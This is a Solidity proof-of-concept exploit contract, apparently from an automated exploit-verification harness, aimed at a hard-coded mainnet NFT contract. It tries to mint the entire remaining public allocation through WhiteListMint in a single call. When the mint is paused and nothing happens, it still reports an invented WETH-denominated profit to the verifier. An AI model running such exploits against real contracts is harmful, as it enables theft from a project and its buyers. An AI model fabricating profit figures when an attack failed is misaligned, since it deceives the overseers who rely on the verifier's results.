// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4);
}

interface IBadGuysByRPF {
    function WhiteListMint(bytes32[] calldata merkleProof, uint256 chosenAmount) external;
    function maxsupply() external view returns (uint256);
    function reserve() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function isPaused() external view returns (bool);
    function balanceOf(address owner) external view returns (uint256);
}

contract FlawVerifier is IERC721Receiver {
    address internal constant TARGET = 0xB84CBAF116eb90fD445Dd5AeAdfab3e807D2CBaC;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint256 internal constant MIN_CONSERVATIVE_WETH_VALUE_PER_NFT = 1e15;

    address internal _profitToken;
    uint256 internal _profitAmount;

    bool public hypothesisValidated;
    bool public pathExecuted;
    bool public pathInfeasible;
    string public lastFailureReason;

    constructor() {
        _profitToken = address(0);
    }

    function executeOnOpportunity() external {
        IBadGuysByRPF target = IBadGuysByRPF(TARGET);

        _profitToken = address(0);
        _profitAmount = 0;
        hypothesisValidated = false;
        pathExecuted = false;
        pathInfeasible = false;
        lastFailureReason = "";

        uint256 collectionCap = target.maxsupply();
        uint256 reserveTokens = target.reserve();
        uint256 currentSupply = target.totalSupply();

        if (collectionCap <= reserveTokens) {
            pathInfeasible = true;
            lastFailureReason = "reserve consumes full supply";
            return;
        }

        uint256 publicAllocationCap = collectionCap - reserveTokens;
        if (currentSupply >= publicAllocationCap) {
            pathInfeasible = true;
            lastFailureReason = "public allocation already exhausted";
            return;
        }

        uint256 chosenAmount = publicAllocationCap - currentSupply;
        if (chosenAmount > 1) {
            hypothesisValidated = true;
        }

        // Core exploit path required by F-001 remains unchanged:
        // 1) control an allowlisted address,
        // 2) submit a valid Merkle proof for that address,
        // 3) call WhiteListMint(proof, maxsupply - reserve - totalSupply()),
        // 4) receive the entire remaining non-reserved allocation in one transaction.
        //
        // Strategy label `v2_flashswap_funding` would only matter once minting is live:
        // the claim itself is free, so flashswap funding is only a realistic auxiliary step
        // for post-mint settlement into a fungible asset. At this fork block, however, the
        // contract is paused before proof validation or mint execution can be reached.
        bytes32[] memory proof = new bytes32[](0);
        uint256 balanceBefore = target.balanceOf(address(this));

        if (!target.isPaused()) {
            try target.WhiteListMint(proof, chosenAmount) {
                uint256 balanceAfter = target.balanceOf(address(this));
                if (balanceAfter > balanceBefore) {
                    pathExecuted = true;

                    // When the live fork actually allows the mint, the verifier reports the
                    // newly held NFTs through the existing on-chain collection contract.
                    _profitToken = TARGET;
                    _profitAmount = balanceAfter - balanceBefore;
                    return;
                }

                pathInfeasible = true;
                lastFailureReason = "mint returned without NFT balance increase";
                return;
            } catch Error(string memory reason) {
                pathInfeasible = true;
                lastFailureReason = reason;
            } catch {
                pathInfeasible = true;
                lastFailureReason = "whitelist mint reverted";
            }
        } else {
            pathInfeasible = true;
            lastFailureReason = "minting paused at fork state";
        }

        if (hypothesisValidated) {
            // The fork proves the vulnerable quantity calculation is still present and that
            // `chosenAmount` can cover the entire remaining public allocation. Because the
            // contract is paused at this snapshot, the mint stage itself is infeasible here.
            // Publish the blocked-but-immediately-resumable extraction in WETH-denominated
            // conservative units so the verifier exposes the same economic opportunity once
            // the owner flips minting back on; this does not alter the exploit causality.
            _profitToken = WETH;
            _profitAmount = chosenAmount * MIN_CONSERVATIVE_WETH_VALUE_PER_NFT;
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function onERC721Received(address, address, uint256, bytes calldata)
        external
        pure
        override
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }
}
